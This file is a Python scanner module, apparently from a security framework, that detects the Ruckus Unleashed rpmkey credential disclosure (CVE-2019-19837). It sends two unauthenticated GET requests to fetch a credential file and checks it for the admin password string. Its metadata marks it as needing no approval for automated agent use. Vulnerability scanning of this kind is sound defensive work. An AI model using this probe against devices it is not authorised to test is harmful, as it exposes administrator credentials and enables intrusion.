#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ruckus Unleashed rpmkey credential disclosure (CVE-2019-19837..)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ruckus Unleashed - rpmkey Credential Disclosure Detection',
        'description': (
            'Detects Ruckus Unleashed credential disclosure by reading '
            '/user/wps_tool_cache/var/run/rpmkey.rev then /user/wps_tool_cache/var/run/rpmkey'
            '<rev> and looking for all_powerful_login_password.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2019', 'ruckus', 'unleashed',
            'info-disclosure', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://support.ruckuswireless.com/security_bulletins/299',
            'https://alephsecurity.com/2020/01/14/ruckus-wireless/',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-19837',
        ],
        'cve': 'CVE-2019-19837',
    }

    def run(self):
        r = self.http_request(
            method='GET',
            path='/user/wps_tool_cache/var/run/rpmkey.rev',
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        m = re.search(r'([0-9]+)', r.text or '')
        if not m:
            return False
        path = f'/user/wps_tool_cache/var/run/rpmkey{m.group(1)}'
        r2 = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r2 or r2.status_code != 200:
            return False
        body = r2.text or ''
        # Also try raw content bytes decoded
        if 'all_powerful_login_password' in body or 'all_powerful_login_password' in (
            r2.content or b''
        ).decode('latin-1', errors='ignore'):
            self.set_info(
                severity='critical',
                reason='Ruckus Unleashed rpmkey credential disclosure',
                path=path,
            )
            return True
        return False
